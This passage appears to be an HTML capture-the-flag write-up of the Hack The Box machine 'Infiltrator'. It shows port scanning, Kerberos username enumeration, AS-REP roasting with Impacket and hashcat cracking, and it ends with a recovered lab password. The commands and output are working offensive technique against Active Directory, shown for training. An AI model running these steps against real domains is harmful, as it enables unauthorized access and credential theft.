style="text-align: right">Windows <picture><source type="image/webp" srcset="/icons/Windows.webp" /><img src="/icons/Windows.png" alt="Windows" class="img-os" /></picture></td> </tr> <tr> <td>Base Points</td> <td style="text-align: right"><span class="diff-Insane">Insane [50]</span></td> </tr> <tr> <td>Rated Difficulty</td> <td style="text-align: right"><picture><source type="image/webp" srcset="/img/infiltrator-diff.webp" /><img src="/img/infiltrator-diff.png" alt="Rated difficulty for Infiltrator" style="display: unset;" /></picture></td> </tr> <tr> <td>Radar Graph</td> <td style="text-align: right"><picture><source type="image/webp" srcset="/img/infiltrator-radar.webp" /><img src="/img/infiltrator-radar.png" alt="Radar chart for Infiltrator" style="display: unset;" /></picture></td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-user.webp" /><img src="/icons/first-blood-user.png" alt="First Blood User" style="display: unset" /></picture></td> <td style="text-align: right"><span class="blood-time">01:44:28</span><a href="https://app.hackthebox.com/users/1387134" target="_blank" rel="noopener"><img alt="kapiushion03" src="https://www.hackthebox.com/badge/image/1387134" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> kapiushion03</span></a><br /></td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-root.webp" /><img src="/icons/first-blood-root.png" alt="First Blood Root" style="display: unset" /></picture></td> <td style="text-align: right"><span class="blood-time">03:05:51</span><a href="https://app.hackthebox.com/users/13569" target="_blank" rel="noopener"><img alt="xct" src="https://www.hackthebox.com/badge/image/13569" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> xct</span></a><br /></td> </tr> <tr> <td>Creator</td> <td style="text-align: right"><a href="https://app.hackthebox.com/users/962022" target="_blank" rel="noopener"><img alt="EmSec" src="https://www.hackthebox.com/badge/image/962022" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> EmSec</span></a><br /></td> </tr> </tbody> </table> <h2 id="recon">Recon</h2> <h3 id="nmap">nmap</h3> <p><code class="language-plaintext highlighter-rouge">nmap</code> finds many open TCP ports, in a combination that suggests a Windows active directory (AD) domain controller (DC):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.31 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 13:24 EDT Nmap scan report for 10.10.11.31 Host is up (0.087s latency). Not shown: 65510 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 5985/tcp open wsman 9389/tcp open adws 15220/tcp open unknown 15223/tcp open unknown 15230/tcp open unknown 49668/tcp open unknown 49688/tcp open unknown 49689/tcp open unknown 49692/tcp open unknown 49718/tcp open unknown 49741/tcp open unknown 49873/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 53,80,88,135,139,389,445,593,636,3268,3269,3389,5985,9389,15220,15223,15230,49668,49688,49689,49692,49718,49741,49873 <span class="nt">-sCV</span> 10.10.11.31 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 13:26 EDT Nmap scan report for 10.10.11.31 Host is up (0.087s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Infiltrator.htb 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-03 17:27:23Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-09-03T17:30:41+00:00; +32s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR | Not valid before: 2024-08-04T18:48:15 |_Not valid after: 2099-07-17T18:48:15 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-09-03T17:30:41+00:00; +32s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR | Not valid before: 2024-08-04T18:48:15 |_Not valid after: 2099-07-17T18:48:15 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-09-03T17:30:41+00:00; +32s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR | Not valid before: 2024-08-04T18:48:15 |_Not valid after: 2099-07-17T18:48:15 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR | Not valid before: 2024-08-04T18:48:15 |_Not valid after: 2099-07-17T18:48:15 |_ssl-date: 2024-09-03T17:30:41+00:00; +32s from scanner time. 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=dc01.infiltrator.htb | Not valid before: 2024-07-30T13:20:17 |_Not valid after: 2025-01-29T13:20:17 |_ssl-date: 2024-09-03T17:30:41+00:00; +32s from scanner time. | rdp-ntlm-info: | Target_Name: INFILTRATOR | NetBIOS_Domain_Name: INFILTRATOR | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: infiltrator.htb | DNS_Computer_Name: dc01.infiltrator.htb | DNS_Tree_Name: infiltrator.htb | Product_Version: 10.0.17763 |_ System_Time: 2024-09-03T17:29:58+00:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 15220/tcp open unknown 15223/tcp open unknown 15230/tcp open unknown 49668/tcp open msrpc Microsoft Windows RPC 49688/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49689/tcp open msrpc Microsoft Windows RPC 49692/tcp open msrpc Microsoft Windows RPC 49718/tcp open msrpc Microsoft Windows RPC 49741/tcp open msrpc Microsoft Windows RPC 49873/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-09-03T17:30:00 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 32s, deviation: 0s, median: 31s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 206.61 seconds </span></code></pre></div></div> <p>There’s a ton there. I’ll note the standard <a href="/cheatsheets/os#windows-domain-controller">DC ports</a> (DNS on 53, Kerberos on 88, LDAP on 389 and other, SMB on 445, RPC on 135, and NetBios on 139). The hostname <code class="language-plaintext highlighter-rouge">DC01</code> and domain name <code class="language-plaintext highlighter-rouge">infiltrator.htb</code> are both leaked. There’s also a couple remote access ports, WinRM (5985) and remote desktop (RDP, 3389). There’s also an HTTP server on 80, and the title of that page is “Infiltrator.htb”. I’ll do a quick fuzz with <code class="language-plaintext highlighter-rouge">ffuf</code> to look for subdomains that respond differently, but not find any. I’ll add update my <code class="language-plaintext highlighter-rouge">hosts</code> with with <code class="language-plaintext highlighter-rouge">10.10.11.31 DC01.infiltrator.htb infiltrator.htb DC01</code>.</p> <p>There’s also some unknown ports on 15220, 15223, and 15230.</p> <h3 id="website---tcp-80">Website - TCP 80</h3> <h4 id="site">Site</h4> <p>The site is for a digital marketing firm:</p> <div style="position: relative;"> <picture> <source type="image/webp" srcset="/img/image-20240903155946880.webp" /> <img loading="lazy" src="/img/image-20240903155946880.png" alt="image-20240903155946880" style="max-height: 500px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));" class="include_image " /> </picture> <a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img src="/icons/expand.png" alt="expand" class="expand-contract" /></a> </div> <p>All of the links lead to places on the same page. There’s a section that shows seven team members:</p> <ul> <li>David Anderson - Digital Marketer</li> <li>Olivia Martinez - Chief Marketing</li> <li>Kevn Turner - QA Tester</li> <li>Amanda Walker - Co Founder</li> <li>Marcus Harris - Developer</li> <li>Lauren Clark - Digital Influencer</li> <li>Ethan Rodriguez - Digital Influence</li> </ul> <p>There’s a contact form at the bottom, but it sends the form data as a GET request that just reloads that page and doesn’t seem to actually do anything.</p> <h4 id="tech-stack">Tech Stack</h4> <p>The main page loads as <code class="language-plaintext highlighter-rouge">/index.html</code>, suggesting it’s a static site (which fits everything else so far).</p> <p>The 404 page is the default IIS page:</p> <picture> <source type="image/webp" srcset="/img/image-20240903160609509.webp" /> <img loading="lazy" src="/img/image-20240903160609509.png" alt="image-20240903160609509" class="include_image " /> </picture> <h4 id="directory-brute-force">Directory Brute Force</h4> <p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x html</code> since I know the site is HTML, but it finds nothing:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="400"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.11.31 <span class="nt">-w</span> /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt <span class="nt">-x</span> html <span class="nt">--dont-extract-links</span> <span class="go"> ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \ \_/ | | \ |__ | |___ | \ | \ | \__, \__/ / \ | |__/ |___ by Ben "epi" Risher 🤓 ver: 2.10.4 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.31 🚀 Threads │ 50 📖 Wordlist │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 👌 Status Codes │ All Status Codes! 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.4 💲 Extensions │ [html] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── </span><span class="feroxbuster-red">404</span><span class="go"> GET 29l 95w 1245c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go"> </span><span class="feroxbuster-green">200</span><span class="go"> GET 617l 1638w 31235c http://10.10.11.31/ </span><span class="feroxbuster-yellow">301</span><span class="go"> GET 2l 10w 149c http://10.10.11.31/assets =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.31/assets/</span><span class="go"> </span><span class="feroxbuster-yellow">301</span><span class="go"> GET 2l 10w 156c http://10.10.11.31/assets/images =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.31/assets/images/</span><span class="go"> </span><span class="feroxbuster-yellow">301</span><span class="go"> GET 2l 10w 152c http://10.10.11.31/assets/js =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.31/assets/js/</span><span class="go"> </span><span class="feroxbuster-yellow">301</span><span class="go"> GET 2l 10w 153c http://10.10.11.31/assets/css =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.31/assets/css/</span><span class="go"> </span><span class="feroxbuster-green">200</span><span class="go"> GET 617l 1638w 31235c http://10.10.11.31/index.html </span><span class="feroxbuster-yellow">301</span><span class="go"> GET 2l 10w 155c http://10.10.11.31/assets/fonts =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.31/assets/fonts/</span><span class="go"> </span><span class="feroxbuster-red">400</span><span class="go"> GET 6l 26w 324c http://10.10.11.31/error%1F_log </span><span class="feroxbuster-red">400</span><span class="go"> GET 6l 26w 324c http://10.10.11.31/error%1F_log.html </span><span class="feroxbuster-red">400</span><span class="go"> GET 6l 26w 324c http://10.10.11.31/assets/error%1F_log </span><span class="feroxbuster-red">400</span><span class="go"> GET 6l 26w 324c http://10.10.11.31/assets/error%1F_log.html </span><span class="feroxbuster-red">400</span><span class="go"> GET 6l 26w 324c http://10.10.11.31/assets/images/error%1F_log </span><span class="feroxbuster-red">400</span><span class="go"> GET 6l 26w 324c http://10.10.11.31/assets/images/error%1F_log.html </span><span class="feroxbuster-red">400</span><span class="go"> GET 6l 26w 324c http://10.10.11.31/assets/js/error%1F_log </span><span class="feroxbuster-red">400</span><span class="go"> GET 6l 26w 324c http://10.10.11.31/assets/css/error%1F_log </span><span class="feroxbuster-red">400</span><span class="go"> GET 6l 26w 324c http://10.10.11.31/assets/js/error%1F_log.html </span><span class="feroxbuster-red">400</span><span class="go"> GET 6l 26w 324c http://10.10.11.31/assets/css/error%1F_log.html </span><span class="feroxbuster-red">400</span><span class="go"> GET 6l 26w 324c http://10.10.11.31/assets/fonts/error%1F_log </span><span class="feroxbuster-red">400</span><span class="go"> GET 6l 26w 324c http://10.10.11.31/assets/fonts/error%1F_log.html [</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 2m 159504/159504 0s </span><span class="feroxbuster-green">found</span><span class="go">:19 </span><span class="feroxbuster-red">errors</span><span class="go">:0 [</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m 26584/26584 258/s http://10.10.11.31/ [</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m 26584/26584 259/s http://10.10.11.31/assets/ [</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m 26584/26584 259/s http://10.10.11.31/assets/images/ [</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m 26584/26584 259/s http://10.10.11.31/assets/js/ [</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m 26584/26584 259/s http://10.10.11.31/assets/css/ [</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m 26584/26584 259/s http://10.10.11.31/assets/fonts/ </span></code></pre></div></div> <p>I’m using <code class="language-plaintext highlighter-rouge">--dont-extract-links</code> because there’s a bunch of images and JavaScript that will make the results much bigger that aren’t useful.</p> <h3 id="smb---tcp-445">SMB - TCP 445</h3> <p><code class="language-plaintext highlighter-rouge">netexec</code> show the box is Windows 10 or Server 2019, with a hostname of DC01 and a domain of <code class="language-plaintext highlighter-rouge">infiltrator.htb</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span></code></pre></div></div> <p>Signing is enabled and SMBv1 is disabled. I’m not able to list shares without valid creds:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">--shares</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> IndexError: list index out of range </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> Error enumerating shares: STATUS_USER_SESSION_DELETED </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> guest <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\guest: STATUS_ACCOUNT_DISABLED </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> oxdf <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\oxdf: STATUS_LOGON_FAILURE </span></code></pre></div></div> <h2 id="shell-as-mharris">Shell as M.Harris</h2> <h3 id="auth-as-lclark">Auth as l.clark</h3> <h4 id="username-brute-force">Username Brute Force</h4> <p>I’ve got seven names from the website. I’ll use <a href="https://github.com/urbanadventurer/username-anarchy">username-anarchy</a> to generate a list of possible usernames from that. I’ll start with this list (using the <code class="language-plaintext highlighter-rouge">username-anarchy</code> column headers) as <code class="language-plaintext highlighter-rouge">names.txt</code>:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>firstname lastname David Anderson Olivia Martinez Kevn Turner Amanda Walker Marcus Harris Lauren Clark Ethan Rodriguez </code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">username-anarchy</code> generates different possible usernames from this:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>/opt/username-anarchy/username-anarchy <span class="nt">-i</span> names.txt <span class="o">&gt;</span> usernames.txt <span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">head </span>usernames.txt <span class="go">david davidanderson david.anderson davidand daviande davida d.anderson danderson adavid a.david </span></code></pre></div></div> <p><a href="https://github.com/ropnop/kerbrute">kerbrute</a> will check each of these against Kerberos to see if they are valid usernames:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kerbrute userenum <span class="nt">-d</span> infiltrator.htb usernames.txt <span class="nt">--dc</span> infiltrator.htb <span class="go"> __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/ Version: v1.0.3 (9dad6e1) - 09/03/24 - Ronnie Flathers @ropnop 2024/09/03 16:32:26 &gt; Using KDC(s): 2024/09/03 16:32:26 &gt; infiltrator.htb:88 2024/09/03 16:32:26 &gt; [+] VALID USERNAME: d.anderson@infiltrator.htb 2024/09/03 16:32:26 &gt; [+] VALID USERNAME: o.martinez@infiltrator.htb 2024/09/03 16:32:26 &gt; [+] VALID USERNAME: k.turner@infiltrator.htb 2024/09/03 16:32:26 &gt; [+] VALID USERNAME: a.walker@infiltrator.htb 2024/09/03 16:32:26 &gt; [+] VALID USERNAME: m.harris@infiltrator.htb 2024/09/03 16:32:26 &gt; [+] VALID USERNAME: e.rodriguez@infiltrator.htb 2024/09/03 16:32:27 &gt; [+] VALID USERNAME: l.clark@infiltrator.htb 2024/09/03 16:32:27 &gt; Done! Tested 104 usernames (7 valid) in 0.966 seconds </span></code></pre></div></div> <p>The format is clearly <code class="language-plaintext highlighter-rouge">[first initial].[lastname]</code>.</p> <h4 id="as-rep-roast">AS-REP-Roast</h4> <p>With a list of valid users, I can check if any have the <code class="language-plaintext highlighter-rouge">DONT_REQUIRE_PREAUTH</code> bit set using <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>GetNPUsers.py infiltrator.htb/ <span class="nt">-dc-ip</span> 10.10.11.31 <span class="nt">-usersfile</span> valid_users <span class="go">Impacket v0.11.0 - Copyright 2023 Fortra [-] User d.anderson doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User o.martinez doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User k.turner doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User a.walker doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User m.harris doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User e.rodriguez doesn't have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$l.clark@INFILTRATOR.HTB:55bacd8d8b7337e8481004cfa120d204$2c02190778c13465bd999c4c267031fc37039b14df8a486e01b569907eeb4ba8071ba38b6d9b3ac748e3a425bbb43b759f636e3ceb99cf4ba6fe02d81b8b9ee79b4766be2797a7a827666bd402913fe59fa6a9b8b5938000b612c4a08c874d3ef91b9df2445636104c6bd9c84236c01386de53e6f7e7cb261bfc98dced925a6f0831f1edeb6db1558e85c1ab7cb3364e421e8c9a114dce972e577feb92ce2e860f89c4280ab9c343c8bd52382545080141f68aba560b8d5dff3bed1138a8ffdcd7d90cc685292750d52017d0f69c5e766781099fd8c85cc91c186e70603162c77b334510ffad191a787fb58b81d0fc5bfef6 </span></code></pre></div></div> <p>L.Clark does!</p> <p><code class="language-plaintext highlighter-rouge">netexec</code> can dump a hash via AS-REP-Roasting as well. As Infiltrator is retiring, there is a dev version of Kerbrute has a version in dev that will automatically do the AS-REP-Roast when it finds a user with the DONT_REQUIRE_PREAUTH flag set.</p> <h4 id="hashcat">Hashcat</h4> <p>I’ll save that hash to a file and pass it to <code class="language-plaintext highlighter-rouge">hashcat</code> with the <code class="language-plaintext highlighter-rouge">rockyou.txt</code> wordlist:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span>hashcat l.clark.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="go">hashcat (v6.2.6) starting in autodetect mode ...[snip]... Hash-mode was not specified with -m. Attempting to auto-detect hash mode. The following mode was auto-detected as the only one matching your input hash: 18200 | Kerberos 5, etype 23, AS-REP | Network Protocol ...[snip]... $krb5asrep$23$l.clark@INFILTRATOR.HTB:55bacd8d8b7337e8481004cfa120d204$2c02190778c13465bd999c4c267031fc37039b14df8a486e01b569907eeb4ba8071ba38b6d9b3ac748e3a425bbb43b759f636e3ceb99cf4ba6fe02d81b8b9ee79b4766be2797a7a827666bd402913fe59fa6a9b8b5938000b612c4a08c874d3ef91b9df2445636104c6bd9c84236c01386de53e6f7e7cb261bfc98dced925a6f0831f1edeb6db1558e85c1ab7cb3364e421e8c9a114dce972e577feb92ce2e860f89c4280ab9c343c8bd52382545080141f68aba560b8d5dff3bed1138a8ffdcd7d90cc685292750d52017d0f69c5e766781099fd8c85cc91c186e70603162c77b334510ffad191a787fb58b81d0fc5bfef6:WAT?watismypass! ...[snip]... </span></code></pre></div></div> <p>The hash cracks in less than a second to “WAT?watismypass!”.</p> <h4 id="validate-password">Validate Password</h4> <p>The password works for SMB:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> l.clark <span class="nt">-p</span> <span class="s1">'WAT?watismypass!'</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\l.clark:WAT?watismypass! </span></code></pre></div></div> <p>It doesn’t work for WinRM, but <code class="language-plaintext highlighter-rouge">netexec</code> says it does for RDP:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec winrm infiltrator.htb <span class="nt">-u</span> l.clark <span class="nt">-p</span> <span class="s1">'WAT?watismypass!'</span> <span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb) </span><span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\l.clark:WAT?watismypass! </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec rdp infiltrator.htb <span class="nt">-u</span> l.clark <span class="nt">-p</span> <span class="s1">'WAT?watismypass!'</span> <span class="netexec-protocol">RDP </span><span class="go"> 10.10.11.31 3389 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True) </span><span class="netexec-protocol">RDP </span><span class="go"> 10.10.11.31 3389 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\l.clark:WAT?watismypass! </span></code></pre></div></div> <p>I am not able to get a connection though, as the server just resets the connection when I connect.</p> <p>The SMB shares are the standard DC ones:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>netexec smb infiltrator.htb <span class="nt">-u</span> l.clark <span class="nt">-p</span> <span class="s1">'WAT?watismypass!'</span> <span class="nt">--shares</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\l.clark:WAT?watismypass! </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated shares </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-shareenum">Share Permissions Remark</span><span class="err"> </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-shareenum">----- ----------- ------ </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-shareenum">ADMIN$ Remote Admin </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-shareenum">C$ Default share </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-shareenum">IPC$ READ Remote IPC </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-shareenum">NETLOGON READ Logon server share </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-shareenum">SYSVOL READ Logon server share </span></code></pre></div></div> <p>There’s nothing interesting on them.</p> <h3 id="auth-as-danderson">Auth as D.Anderson</h3> <h4 id="user-enumeration">User Enumeration</h4> <p>I was able to find seven usernames from the website, but it’s worth checking for addition users:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> l.clark <span class="nt">-p</span> <span class="s1">'WAT?watismypass!'</span> <span class="nt">--users</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\l.clark:WAT?watismypass! </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 -Username- -Last PW Set- -BadPW- -Description- </span><span 